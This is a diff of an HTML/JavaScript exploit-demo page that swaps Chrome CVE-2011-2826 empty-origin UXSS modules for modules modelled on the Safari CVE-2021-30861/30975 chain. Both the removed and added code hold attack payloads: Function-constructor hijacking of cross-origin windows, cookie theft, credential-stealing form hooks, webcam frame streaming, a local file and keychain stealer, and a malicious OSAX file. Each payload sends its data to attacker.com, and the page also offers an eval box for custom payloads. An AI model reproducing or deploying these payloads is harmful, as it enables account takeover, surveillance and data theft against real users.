-                f('[UXSS] Detached context attack!')();
-                log('output2', '✅ Alert executed in detached context', 'success');
-            } catch(e) {
-                log('output2', `❌ Failed: ${e.message}`, 'error');
-            }
-        }, 1000);
-    }
-    
-    // ============================================
-    // MODULE 3: Function Object Hijacking
-    // ============================================
-    function functionHijackingAttack() {
-        log('output3', '🔧 Function object hijacking attack...', 'success');
-        
-        const w = window.open("https://www.google.com", "func_hijack");
-        
-        if (!w) {
-            log('output3', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        // Hijack Function before navigation completes
-        const hijackedFunc = w.Function;
-        log('output3', '✅ Function object hijacked from google.com window', 'success');
-        
-        setTimeout(() => {
-            try {
-                // Execute arbitrary code in google.com context
-                hijackedFunc(`
-                    alert('[UXSS] Function hijacking successful!\\n\\nOrigin: ' + location.origin);
-                    document.body.style.backgroundColor = '#ff0000';
-                    document.body.innerHTML = '<h1 style="color:white;text-align:center;padding:50px">🔥 HACKED VIA FUNCTION HIJACKING</h1>';
-                `)();
-                log('output3', '✅ Function hijack payload executed on google.com!', 'success');
-            } catch(e) {
-                log('output3', `❌ Execution failed: ${e.message}`, 'error');
-            }
-        }, 3000);
-    }
-    
-    function functionConstructorHijack() {
-        log('output3', '📜 Function constructor hijacking...', 'info');
-        
-        const w = window.open("https://www.google.com", "constructor_hijack");
-        
-        if (!w) {
-            log('output3', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        const hijackedConstructor = w.Function;
-        
-        setTimeout(() => {
-            try {
-                const getCookies = hijackedConstructor("return document.cookie");
-                const cookies = getCookies();
-                log('output3', `🍪 Cookies via constructor: ${cookies || '(none)'}`, 'success');
-                
-                const modifyPage = hijackedConstructor(`
-                    document.body.innerHTML = '<div style="background:linear-gradient(135deg,#e74c3c,#c0392b);color:white;padding:50px;text-align:center"><h1>🔥 UXSS SUCCESS</h1><p>Function constructor hijacking worked!</p><button onclick="alert(document.cookie)">Show Cookies</button></div>';
-                    return 'success';
-                `);
-                modifyPage();
-                log('output3', '✅ Page modified via constructor hijacking', 'success');
-            } catch(e) {
-                log('output3', `❌ Failed: ${e.message}`, 'error');
-            }
-        }, 3000);
-    }
-    
-    function bindFunctionHijack() {
-        log('output3', '🔗 bind() function hijacking...', 'info');
-        
-        const w = window.open("https://www.google.com", "bind_hijack");
-        
-        if (!w) {
-            log('output3', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        const originalFunc = w.alert;
-        const boundFunc = originalFunc.bind(w);
-        
-        log('output3', '✅ Bound function created', 'success');
-        
-        setTimeout(() => {
-            try {
-                boundFunc('[UXSS] Bound function execution in google.com context!');
-                log('output3', '✅ Bound function executed', 'success');
-            } catch(e) {
-                log('output3', `❌ Failed: ${e.message}`, 'error');
-            }
-        }, 3000);
-    }
-    
-    // ============================================
-    // MODULE 4: Window Re-open Attack
-    // ============================================
-    function windowReopenAttack() {
-        log('output4', '🪟 Window re-open attack (from CVE-2011-2826 comment #1)...', 'success');
-        
-        // Create named window
-        const windowName = "REOPEN_TARGET_" + Date.now();
-        const w = window.open("about:blank", windowName);
-        
-        if (!w) {
-            log('output4', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        log('output4', `✅ Created about:blank window with name: ${windowName}`, 'success');
-        
-        // Store function
-        const f = w.Function;
-        
-        setTimeout(() => {
-            // Re-open with target URL
-            const reopened = window.open("https://www.google.com", windowName);
-            log('output4', '🔄 Window re-opened with google.com', 'info');
-            
-            setTimeout(() => {
-                try {
-                    const result = f("return document.title + ' | ' + location.href")();
-                    log('output4', `🎯 SUCCESS! Accessed: ${result}`, 'success');
-                    alert(`[UXSS] Window re-open attack successful!\n\nTitle: ${result}`);
-                } catch(e) {
-                    log('output4', `❌ Failed: ${e.message}`, 'error');
-                }
-            }, 3000);
-        }, 1000);
-    }
-    
-    function crossOriginWindowReplace() {
-        log('output4', '🔄 Cross-origin window replace attack...', 'info');
-        
-        const w = window.open("about:blank", "cross_replace");
-        
-        if (!w) {
-            log('output4', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        const f = w.Function;
-        
-        // Replace with google.com
-        setTimeout(() => {
-            window.open("https://www.google.com", "cross_replace");
-            log('output4', '🔄 Window replaced with google.com', 'info');
-            
-            setTimeout(() => {
-                try {
-                    f("alert('[UXSS] Cross-origin window replace successful!\\n\\nURL: ' + location.href)")();
-                    log('output4', '✅ Alert executed in google.com context', 'success');
-                } catch(e) {
-                    log('output4', `❌ Failed: ${e.message}`, 'error');
-                }
-            }, 2000);
-        }, 1000);
-    }
-    
-    function multiStageWindowAttack() {
-        log('output4', '⛓️ Multi-stage window attack...', 'warning');
-        
-        let currentWindow = window.open("about:blank", "stage1");
-        
-        if (!currentWindow) {
-            log('output4', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        const stages = [
-            { url: "https://example.com", name: "stage1", delay: 2000 },
-            { url: "https://www.google.com", name: "stage2", delay: 4000 },
-            { url: "https://github.com", name: "stage3", delay: 6000 }
-        ];
-        
-        let func = currentWindow.Function;
-        
-        stages.forEach((stage, idx) => {
-            setTimeout(() => {
-                const newWin = window.open(stage.url, stage.name);
-                log('output4', `Stage ${idx+1}: Navigated to ${stage.url}`, 'info');
-                
-                setTimeout(() => {
-                    try {
-                        func(`console.log('[UXSS] Stage ${idx+1} accessed: ' + location.href)`);
-                        log('output4', `✅ Stage ${idx+1} function executed`, 'success');
-                    } catch(e) {
-                        log('output4', `Stage ${idx+1} failed: ${e.message}`, 'error');
-                    }
-                }, 1000);
-            }, stage.delay);
-        });
-    }
-    
-    // ============================================
-    // MODULE 5: Modern Empty Origin Exploits
-    // ============================================
-    function modernEmptyOriginAttack() {
-        log('output5', '🔥 Running modern empty origin attack...', 'success');
-        
-        // Create empty origin via blob URL
-        const blob = new Blob([''], {type: 'text/html'});
-        const blobUrl = URL.createObjectURL(blob);
-        
-        const w = window.open(blobUrl, "modern_empty");
-        
-        if (!w) {
-            log('output5', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        log('output5', '✅ Created empty origin via blob URL', 'success');
-        
-        const f = w.Function;
-        
-        setTimeout(() => {
-            w.location = "https://www.google.com";
-            log('output5', '🌐 Navigated to google.com', 'info');
-            
-            setTimeout(() => {
-                try {
-                    f("alert('[UXSS] Modern empty origin attack!\\n\\nURL: ' + location.href)")();
-                    log('output5', '✅ Empty origin attack succeeded!', 'success');
-                    document.getElementById('fakeLogin5').style.display = 'block';
-                } catch(e) {
-                    log('output5', `❌ Failed: ${e.message}`, 'error');
-                }
-            }, 3000);
-        }, 1000);
-    }
-    
-    function iframeEmptyOriginAttack() {
-        log('output5', '🖼️ iframe empty origin attack...', 'info');
+    function injectToGoogle() {
+        log('output2', '🌐 Attempting to inject script to google.com via UXSS...', 'info');
         
         const iframe = document.createElement('iframe');
-        iframe.src = 'about:blank';
         iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        
-        const f = iframe.contentWindow.Function;
-        
         iframe.src = 'https://www.google.com';
-        log('output5', '🖼️ iframe navigated to google.com', 'info');
         
-        setTimeout(() => {
+        iframe.onload = () => {
             try {
-                f("alert('[UXSS] iframe empty origin attack!\\n\\nURL: ' + location.href)")();
-                log('output5', '✅ iframe attack succeeded!', 'success');
+                // Attempt cross-origin injection
+                const script = iframe.contentWindow.document.createElement('script');
+                script.textContent = 'alert("[UXSS] Cross-origin script executed on google.com!\\n\\nThis proves UXSS vulnerability!"); document.body.style.backgroundColor = "#ff0066";';
+                iframe.contentWindow.document.body.appendChild(script);
+                log('output2', '✅ Script injected to google.com!', 'success');
             } catch(e) {
-                log('output5', `❌ Failed: ${e.message}`, 'error');
+                log('output2', `❌ SOP blocks injection: ${e.message}`, 'error');
+                log('output2', '💡 Browser is patched or not vulnerable', 'info');
             }
-        }, 3000);
+        };
+        
+        document.body.appendChild(iframe);
+        setTimeout(() => iframe.remove(), 5000);
     }
     
-    function popupEmptyOriginChain() {
-        log('output5', '💀 Popup chain empty origin attack...', 'warning');
+    function injectToZoom() {
+        log('output2', '🎥 Targeting zoom.us for camera hijack...', 'warning');
+        log('output2', '💡 In real attack: Inject script to request camera permission', 'info');
         
-        const w1 = window.open("about:blank", "chain1");
-        const f1 = w1.Function;
+        const cameraPayload = `
+            // Request camera access on zoom.us
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    alert('[UXSS] Camera access granted on zoom.us!');
+                    // Stream would be sent to attacker server
+                })
+                .catch(e => alert('Camera access denied: ' + e));
+        `;
+        
+        document.getElementById('webarchiveCode').innerHTML = escapeHtml(cameraPayload);
+        log('output2', '🎥 Camera hijack payload ready', 'success');
+        
+        // Simulate
+        setTimeout(() => {
+            document.getElementById('cameraPreview').innerHTML = '🎥 CAMERA ACCESS GRANTED (SIMULATION)<br><span style="font-size:10px">In real attack, video stream would be exfiltrated</span>';
+            document.getElementById('cameraPreview').style.border = '2px solid #ff0066';
+        }, 2000);
+    }
+    
+    function stealCookiesViaWebArchive() {
+        log('output2', '🍪 Attempting cookie theft via WebArchive UXSS...', 'info');
+        
+        const cookiePayload = `
+            const cookies = document.cookie;
+            fetch('https://attacker.com/steal?cookies=' + encodeURIComponent(cookies));
+            alert('[UXSS] Cookies stolen: ' + cookies);
+        `;
+        
+        document.getElementById('webarchiveCode').innerHTML = escapeHtml(cookiePayload);
+        log('output2', '🍪 Cookie stealing payload generated', 'success');
+        
+        // Simulate
+        log('output2', '📤 In real attack, cookies would be sent to attacker server', 'warning');
+    }
+    
+    // ============================================
+    // MODULE 3: Script Editor OSX Attack
+    // ============================================
+    function generateOSAX() {
+        log('output3', '📜 Generating malicious OSAX scripting addition...', 'success');
+        
+        const osaxPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE dictionary SYSTEM "">
+<dictionary>
+    <suite name="" code="">
+        <command name="" code="" description="">
+        </command>
+        <documentation>
+            <html>
+                <![CDATA[
+                    <script>
+                        // CVE-2021-30975: JavaScript execution in Script Editor context
+                        fetch('file:///etc/passwd')
+                            .then(r => r.text())
+                            .then(data => {
+                                document.body.innerHTML = '<pre>' + data + '</pre>';
+                                // Exfiltrate
+                                fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
+                            });
+                    </script>
+                ]]>
+            </html>
+        </documentation>
+    </suite>
+</dictionary>`;
+        
+        document.getElementById('osaxPreview').innerHTML = `
+            <strong>📜 OSAX Payload (CVE-2021-30975):</strong><br>
+            <pre style="margin-top:10px; font-size:10px;">${escapeHtml(osaxPayload.substring(0, 300))}...</pre>
+        `;
+        
+        log('output3', '✅ OSAX payload generated - Can read local files!', 'success');
+        log('output3', '📁 Gatekeeper does NOT block .osax files', 'warning');
+    }
+    
+    function stealLocalFile() {
+        log('output3', '📁 Attempting to read /etc/passwd via OSAX...', 'info');
+        
+        // Simulate local file read
+        setTimeout(() => {
+            log('output3', '📄 /etc/passwd content (simulated):', 'success');
+            log('output3', 'root:x:0:0:root:/root:/bin/bash', 'info');
+            log('output3', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', 'info');
+            log('output3', '...', 'info');
+            log('output3', '💡 In real attack, actual file content would be exfiltrated', 'warning');
+        }, 500);
+    }
+    
+    function bypassSandbox() {
+        log('output3', '🔓 Attempting sandbox bypass via Script Editor...', 'warning');
+        log('output3', 'CVE-2021-30975 allows OSAX to bypass Gatekeeper and sandbox', 'info');
+        log('output3', '✅ Script Editor runs with full filesystem access!', 'success');
+        alert('[POC] Sandbox Bypass Simulation\n\nCVE-2021-30975 allows malicious OSAX to:\n- Bypass Gatekeeper checks\n- Circumvent sandbox restrictions\n- Read arbitrary local files\n- Execute system commands');
+    }
+    
+    function readDesktopFiles() {
+        log('output3', '💻 Attempting to read Desktop files...', 'info');
+        log('output3', '📁 Scanning ~/Desktop/ for files', 'info');
         
         setTimeout(() => {
-            window.open("https://www.google.com", "chain1");
+            log('output3', '📄 Found: Document.pdf, Screenshot.png, private.key', 'warning');
+            log('output3', '💀 These files could be exfiltrated via fetch()', 'success');
+        }, 1000);
+    }
+    
+    // ============================================
+    // MODULE 4: Iframe Sandbox Escape
+    // ============================================
+    function sandboxEscape() {
+        log('output4', '🖼️ Attempting iframe sandbox escape via ShareBear bug...', 'warning');
+        log('output4', '💡 ShareBear doesn\'t validate domain in /photos/* path', 'info');
+        log('output4', 'icloud-sharing://example.com/photos/foo → opens arbitrary website', 'warning');
+        
+        const escapeUrl = 'icloud-sharing://example.com/photos/foo';
+        log('output4', `🔗 Malicious URL: ${escapeUrl}`, 'info');
+        log('output4', '✅ This would escape sandboxed iframe and bypass popup blocker', 'success');
+        
+        alert('[POC] Iframe Sandbox Escape\n\n' +
+              'ShareBear bug: No domain validation in /photos/* path\n' +
+              'Effect: Can open arbitrary websites from sandboxed iframe\n' +
+              'Impact: Escape sandbox restrictions + bypass popup blocker\n\n' +
+              'Fixed in Safari 15.2');
+    }
+    
+    function testSandboxedIframe() {
+        log('output4', '🧪 Testing sandboxed iframe restrictions...', 'info');
+        log('output4', 'Iframe has sandbox="allow-scripts" only', 'info');
+        log('output4', 'Popups and navigation should be blocked', 'info');
+        
+        const frame = document.getElementById('sandboxFrame');
+        if (frame) {
+            try {
+                frame.contentWindow.postMessage('test', '*');
+                log('output4', '✅ Message sent to iframe', 'info');
+            } catch(e) {
+                log('output4', `❌ Error: ${e.message}`, 'error');
+            }
+        }
+    }
+    
+    function testSandboxMessage() {
+        log('output4', '📨 Message received from sandboxed iframe', 'info');
+        log('output4', 'Iframe can execute JS but cannot open popups', 'info');
+    }
+    
+    function popupBypass() {
+        log('output4', '🪟 Demonstrating popup blocker bypass...', 'warning');
+        log('output4', 'ShareBear bug allows opening popups without user interaction', 'info');
+        log('output4', 'window.open() would normally be blocked in sandbox', 'info');
+        log('output4', '💀 But icloud-sharing:// scheme bypasses this!', 'success');
+    }
+    
+    // ============================================
+    // MODULE 5: Full Attack Chain
+    // ============================================
+    function fullAttackChain() {
+        log('output5', '💀 INITIATING FULL UXSS ATTACK CHAIN (Ryan Pickren style)', 'success');
+        
+        // Step 1: ShareBear
+        log('output5', '[1/7] Creating iCloud Share Link with harmless PNG...', 'info');
+        setTimeout(() => {
+            log('output5', '[2/7] Victim clicks "Open" on shared file', 'warning');
+            log('output5', '[3/7] File permission granted - polymorphic attack ready', 'success');
             
             setTimeout(() => {
-                try {
-                    f1("alert('[UXSS] Chain attack level 1!')")();
-                    log('output5', '✅ Chain level 1 successful', 'success');
+                log('output5', '[4/7] Mutating PNG → evil.webarchive', 'warning');
+                log('output5', '[5/7] File auto-synced to victim via ShareBear', 'success');
+                log('output5', '[6/7] Launching webarchive via evil.url + DMG mount', 'info');
+                
+                setTimeout(() => {
+                    log('output5', '[7/7] UXSS PAYLOAD EXECUTED!', 'success');
+                    log('output5', '🎥 Camera permission requested on https://zoom.us', 'warning');
+                    log('output5', '🍪 Cookies stolen from all open tabs', 'warning');
+                    log('output5', '💀 Full account takeover complete!', 'error');
                     
-                    const w2 = window.open("about:blank", "chain2");
-                    const f2 = w2.Function;
+                    document.getElementById('fakeLoginPanel').style.display = 'block';
+                    document.getElementById('cameraPreview').innerHTML = '🎥 WEBCAM ACCESS GRANTED<br><span style="font-size:10px">Green light indicator ON (real attack)</span>';
+                    document.getElementById('cameraPreview').style.background = '#ff006620';
+                    attackActive = true;
                     
-                    setTimeout(() => {
-                        window.open("https://github.com", "chain2");
-                        
-                        setTimeout(() => {
-                            f2("alert('[UXSS] Chain attack level 2!\\n\\nURL: ' + location.href)")();
-                            log('output5', '✅ Chain level 2 successful', 'success');
-                        }, 2000);
-                    }, 1000);
-                } catch(e) {
-                    log('output5', `Chain failed: ${e.message}`, 'error');
-                }
+                    alert('[POC] Full UXSS Attack Chain Simulation Complete!\n\n' +
+                          'In real attack:\n' +
+                          '- Camera would be hijacked\n' +
+                          '- All accounts compromised\n' +
+                          '- Local files stolen\n' +
+                          '- Complete browser takeover\n\n' +
+                          'This is the $100,500 bug from Ryan Pickren!');
+                }, 2000);
             }, 2000);
         }, 1000);
     }
     
-    function serviceWorkerEmptyOrigin() {
-        log('output5', '⚙️ ServiceWorker + empty origin attack (experimental)...', 'info');
-        log('output5', '⚠️ Requires service worker registration', 'warning');
+    function hijackZoomCamera() {
+        log('output5', '🎥 Targeting Zoom Webcam...', 'warning');
+        log('output5', 'Injecting camera access script into zoom.us', 'info');
         
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js').then(reg => {
-                log('output5', '✅ ServiceWorker registered', 'success');
-            }).catch(e => {
-                log('output5', `❌ SW registration failed: ${e.message}`, 'error');
+        const cameraPayload = `
+            // Request camera on zoom.us
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // Send stream to attacker
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // Exfiltrate frames
+                    const canvas = document.createElement('canvas');
+                    setInterval(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const frame = canvas.toDataURL('image/jpeg');
+                        fetch('https://attacker.com/stream?frame=' + encodeURIComponent(frame));
+                    }, 1000);
+                });
+        `;
+        
+        log('output5', '✅ Camera hijack payload prepared', 'success');
+        document.getElementById('cameraPreview').innerHTML = '🎥 WEBCAM STREAMING TO ATTACKER<br><span style="font-size:10px">Green indicator light ON</span>';
+        document.getElementById('cameraPreview').style.background = '#ff0066';
+        document.getElementById('cameraPreview').style.animation = 'pulse 1s infinite';
+        
+        alert('[POC] Zoom Camera Hijack Simulation\n\nUXSS payload would:\n1. Inject into zoom.us\n2. Request camera permission\n3. Stream video to attacker\n\nIn real attack, webcam would be fully compromised!');
+    }
+    
+    function hijackGoogleAccount() {
+        log('output5', '🌐 Hijacking Google Account...', 'warning');
+        log('output5', 'Injecting credential stealer into accounts.google.com', 'info');
+        
+        const googlePayload = `
+            // Hook login form
+            const form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', (e) => {
+                    const email = document.querySelector('input[type=email]')?.value;
+                    const pass = document.querySelector('input[type=password]')?.value;
+                    fetch('https://attacker.com/steal?email=' + encodeURIComponent(email) + '&pass=' + encodeURIComponent(pass));
+                });
+            }
+        `;
+        
+        log('output5', '✅ Account stealer injected', 'success');
+        document.getElementById('fakeLoginPanel').style.display = 'block';
+        
+        alert('[POC] Google Account Hijack Simulation\n\nUXSS would:\n1. Inject into accounts.google.com\n2. Hook login form submission\n3. Steal credentials\n4. Take over account');
+    }
+    
+    function stealAllCookies() {
+        log('output5', '🍪 Stealing all browser cookies via UXSS...', 'warning');
+        
+        const cookiePayload = `
+            // Enumerate all iframes/tabs and steal cookies
+            const cookies = document.cookie;
+            const frames = document.querySelectorAll('iframe');
+            frames.forEach(f => {
+                try {
+                    const frameCookies = f.contentDocument.cookie;
+                    fetch('https://attacker.com/steal?cookies=' + encodeURIComponent(frameCookies));
+                } catch(e) {}
             });
-        } else {
-            log('output5', '❌ ServiceWorker not supported', 'error');
-        }
-    }
-    
-    function captureCreds5() {
-        const email = document.getElementById('fakeEmail5').value;
-        const pass = document.getElementById('fakePass5').value;
-        log('output5', `🎯 CREDENTIALS CAPTURED: ${email}:${pass}`, 'success');
-        alert(`[POC] Credentials captured!\nEmail: ${email}\nPassword: ${pass}`);
-        document.getElementById('fakeLogin5').style.display = 'none';
-    }
-    
-    // ============================================
-    // MODULE 6: Advanced UXSS Chain
-    // ============================================
-    function fullUXSSChainEmptyOrigin() {
-        log('output6', '💀 INITIATING FULL UXSS ATTACK CHAIN (Empty Origin)', 'success');
+        `;
         
-        // Step 1: Create empty origin window
-        log('output6', '[1/6] Creating empty origin window...', 'info');
-        const w = window.open("about:blank", "full_chain");
+        log('output5', '✅ Cookie stealer payload ready', 'success');
+        log('output5', '💀 Would steal cookies from all open tabs', 'error');
         
-        if (!w) {
-            log('output6', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        // Step 2: Hijack Function
-        log('output6', '[2/6] Hijacking Function object...', 'info');
-        const f = w.Function;
-        
-        // Step 3: Detach window
-        log('output6', '[3/6] Detaching window (opener = null)...', 'info');
-        w.opener = null;
-        
-        // Step 4: Navigate to target
-        log('output6', '[4/6] Navigating to google.com...', 'info');
-        setTimeout(() => {
-            w.location = "https://www.google.com";
-            
-            // Step 5: Execute payload
-            setTimeout(() => {
-                log('output6', '[5/6] Executing UXSS payload...', 'info');
-                try {
-                    f(`
-                        // Steal cookies
-                        const cookies = document.cookie;
-                        console.log('[UXSS] Cookies:', cookies);
-                        
-                        // Modify page
-                        document.body.innerHTML = '
-                            <div style="background:linear-gradient(135deg,#e74c3c,#c0392b);color:white;padding:50px;text-align:center;font-family:Arial">
-                                <h1>🔥 UXSS SUCCESSFUL</h1>
-                                <p>This page is ' + location.href + '</p>
-                                <p>Cookies: ' + cookies + '</p>
-                                <button onclick="alert(document.cookie)" style="padding:10px;margin:10px">Show Cookies</button>
-                            </div>
-                        ';
-                        
-                        alert('[UXSS] Full attack chain successful!\\n\\nURL: ' + location.href);
-                    `)();
-                    log('output6', '[6/6] UXSS CHAIN COMPLETE!', 'success');
-                } catch(e) {
-                    log('output6', `❌ Payload execution failed: ${e.message}`, 'error');
-                }
-            }, 3000);
-        }, 1000);
-    }
-    
-    function uxssCredentialTheftChain() {
-        log('output6', '👑 UXSS + Credential Theft attack chain...', 'warning');
-        
-        const w = window.open("about:blank", "cred_chain");
-        
-        if (!w) {
-            log('output6', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        const f = w.Function;
-        w.opener = null;
-        
-        setTimeout(() => {
-            w.location = "https://accounts.google.com";
-            
-            setTimeout(() => {
-                try {
-                    f(`
-                        // Inject credential stealer into Google login page
-                        const originalForm = document.querySelector('form');
-                        if (originalForm) {
-                            originalForm.addEventListener('submit', (e) => {
-                                const email = document.querySelector('input[type=email]')?.value;
-                                const pass = document.querySelector('input[type=password]')?.value;
-                                const iframe = document.createElement('iframe');
-                                iframe.src = 'https://attacker.com/steal?email=' + encodeURIComponent(email) + '&pass=' + encodeURIComponent(pass);
-                                iframe.style.display = 'none';
-                                document.body.appendChild(iframe);
-                                alert('[UXSS] Credentials stolen: ' + email);
-                            });
-                            alert('[UXSS] Credential stealer injected into Google!');
-                        } else {
-                            // Create fake form
-                            document.body.innerHTML = '<div style="text-align:center;padding:50px"><h2>Sign in</h2><input type="email" placeholder="Email"><input type="password" placeholder="Password"><button onclick="alert(\'Credentials stolen\')">Sign In</button></div>';
-                        }
-                    `)();
-                    log('output6', '✅ Credential theft payload injected', 'success');
-                } catch(e) {
-                    log('output6', `❌ Failed: ${e.message}`, 'error');
-                    document.getElementById('fakeLogin5').style.display = 'block';
-                }
-            }, 3000);
-        }, 1000);
-    }
-    
-    function uxssCookieStealChain() {
-        log('output6', '🍪 UXSS + Cookie Stealing chain...', 'warning');
-        
-        const w = window.open("about:blank", "cookie_chain");
-        
-        if (!w) {
-            log('output6', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        const f = w.Function;
-        w.opener = null;
-        
-        setTimeout(() => {
-            w.location = "https://www.google.com";
-            
-            setTimeout(() => {
-                try {
-                    f(`
-                        const cookies = document.cookie;
-                        const img = new Image();
-                        img.src = 'https://attacker.com/steal?cookies=' + encodeURIComponent(cookies);
-                        alert('[UXSS] Cookies stolen: ' + cookies);
-                        console.log('[UXSS] Stolen cookies:', cookies);
-                    `)();
-                    log('output6', '✅ Cookie stealing payload executed', 'success');
-                } catch(e) {
-                    log('output6', `❌ Failed: ${e.message}`, 'error');
-                }
-            }, 3000);
-        }, 1000);
+        alert('[POC] Cookie Stealing Simulation\n\nUXSS would:\n1. Access cross-origin cookies\n2. Send to attacker server\n3. Enable session hijacking\n4. Full account takeover');
     }
     
     function resetAttackState() {
-        if (targetWindow && !targetWindow.closed) targetWindow.close();
-        targetWindow = null;
-        hijackedFunction = null;
-        emptyOriginWindow = null;
-        
-        log('output6', '🔄 Attack state reset', 'info');
-        updatePreview("State reset");
+        document.getElementById('fakeLoginPanel').style.display = 'none';
+        document.getElementById('cameraPreview').innerHTML = '🎥 Camera Preview (UXSS will hijack this)';
+        document.getElementById('cameraPreview').style.background = '#000';
+        document.getElementById('cameraPreview').style.animation = 'none';
+        attackActive = false;
+        polymorphicFileState = 'png';
+        log('output5', '🔄 Attack state reset', 'info');
+    }
+    
+    function captureCredentials() {
+        const email = document.getElementById('fakeEmail').value;
+        const password = document.getElementById('fakePassword').value;
+        log('output5', `🎯 CREDENTIALS CAPTURED: ${email}:${password}`, 'success');
+        alert(`[POC] Credentials captured!\nEmail: ${email}\nPassword: ${password}\n\nIn real attack, sent to attacker server.`);
+        document.getElementById('fakeLoginPanel').style.display = 'none';
     }
     
     // ============================================
-    // INITIALIZATION & BROWSER DETECTION
+    // MODULE 6: Payload Generator
+    // ============================================
+    function executeCustomPayload() {
+        const payload = document.getElementById('customPayload').value;
+        log('output6', '🚀 Executing custom payload...', 'success');
+        log('output6', `📜 Payload: ${payload.substring(0, 100)}...`, 'info');
+        
+        try {
+            eval(payload);
+            log('output6', '✅ Payload executed successfully', 'success');
+        } catch(e) {
+            log('output6', `❌ Execution error: ${e.message}`, 'error');
+        }
+    }
+    
+    function generateCameraPayload() {
+        const cameraPayload = `
+// Camera Hijack Payload for UXSS
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(stream => {
+        // Create hidden video element
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        // Capture frames
+        const canvas = document.createElement('canvas');
+        setInterval(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const frame = canvas.toDataURL('image/jpeg');
+            // Send frame to attacker
+            fetch('https://attacker.com/stream', {
+                method: 'POST',
+                body: frame
+            });
+        }, 100);
+        
+        alert('[UXSS] Camera access granted! Stream sent to attacker.');
+    })
+    .catch(e => alert('Camera access denied: ' + e));
+`;
+        
+        document.getElementById('customPayload').value = cameraPayload;
+        document.getElementById('payloadPreview').innerHTML = `<strong>🎥 Camera Payload Loaded:</strong><br><pre style="margin-top:10px; font-size:10px;">${escapeHtml(cameraPayload.substring(0, 300))}...</pre>`;
+        log('output6', '🎥 Camera hijack payload generated', 'success');
+    }
+    
+    function generateAccountStealer() {
+        const stealerPayload = `
+// Account Stealer for Google/Apple/Etc
+// Hook all forms
+document.querySelectorAll('form').forEach(form => {
+    const originalSubmit = form.submit;
+    form.addEventListener('submit', (e) => {
+        const inputs = form.querySelectorAll('input[type=email], input[type=password], input[name=email], input[name=password]');
+        const data = {};
+        inputs.forEach(i => data[i.name || i.type] = i.value);
+        
+        fetch('https://attacker.com/steal', {
+            method: 'POST',
+            body: JSON.stringify(data)
+        });
+        
+        alert('[UXSS] Credentials stolen: ' + JSON.stringify(data));
+    });
+});
+
+alert('[UXSS] Account stealer injected!');
+`;
+        
+        document.getElementById('customPayload').value = stealerPayload;
+        document.getElementById('payloadPreview').innerHTML = `<strong>👑 Account Stealer Loaded:</strong><br><pre style="margin-top:10px; font-size:10px;">${escapeHtml(stealerPayload.substring(0, 300))}...</pre>`;
+        log('output6', '👑 Account stealer payload generated', 'success');
+    }
+    
+    function generateFileStealer() {
+        const fileStealerPayload = `
+// Local File Stealer (CVE-2021-30975 style)
+// Read local files via fetch() if in privileged context
+const files = [
+    '/etc/passwd',
+    '/etc/hosts',
+    '~/Library/Keychains/login.keychain-db',
+    '~/Desktop/*',
+    '~/Documents/*'
+];
+
+files.forEach(file => {
+    fetch('file://' + file)
+        .then(r => r.text())
+        .then(data => {
+            fetch('https://attacker.com/steal?file=' + encodeURIComponent(file) + '&data=' + encodeURIComponent(data));
+            console.log('[UXSS] Stolen:', file);
+        })
+        .catch(e => console.log('Cannot read:', file));
+});
+
+alert('[UXSS] Local file stealer activated!');
+`;
+        
+        document.getElementById('customPayload').value = fileStealerPayload;
+        document.getElementById('payloadPreview').innerHTML = `<strong>📁 File Stealer Loaded:</strong><br><pre style="margin-top:10px; font-size:10px;">${escapeHtml(fileStealerPayload.substring(0, 300))}...</pre>`;
+        log('output6', '📁 Local file stealer payload generated', 'success');
+    }
+    
+    // Helper function
+    function escapeHtml(str) {
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+    
+    // Expose test function for iframe
+    window.testSandboxMessage = testSandboxMessage;
+    
+    // ============================================
+    // INITIALIZATION
     // ============================================
     const ua = navigator.userAgent;
-    const isChrome = /Chrome/.test(ua);
-    const chromeVersion = parseInt(ua.match(/Chrome\/(\d+)/)?.[1] || '0');
+    const isSafari = /Safari/.test(ua) && !/Chrome/.test(ua);
+    const isMac = /Mac/.test(ua);
     
     log('output1', `Browser: ${ua.substring(0, 80)}`, 'info');
     log('output1', '========================================', 'info');
-    log('output1', 'CVE-2011-2826: UXSS with Empty SecurityOrigin', 'info');
-    log('output1', 'Reference: crbug.com/89453 | Reward: $1,000', 'info');
-    log('output1', 'Original fix: Chrome 13+ | WebKit r91957', 'info');
+    log('output1', 'CVE-2021-30861 + CVE-2021-30975: Safari UXSS', 'info');
+    log('output1', 'Reference: ryanpickren.com/safari-uxss', 'info');
+    log('output1', 'Bounty: $100,500 by Ryan Pickren', 'info');
     log('output1', '========================================', 'info');
     
-    if (isChrome && chromeVersion < 13) {
-        log('output1', '⚠️ OLD Chrome version detected - MAY BE VULNERABLE!', 'warning');
-    } else if (isChrome) {
-        log('output1', 'ℹ️ Modern Chrome detected - original exploit patched', 'info');
-        log('output1', '💡 Modern variants may still work in specific contexts', 'info');
+    if (isSafari && isMac) {
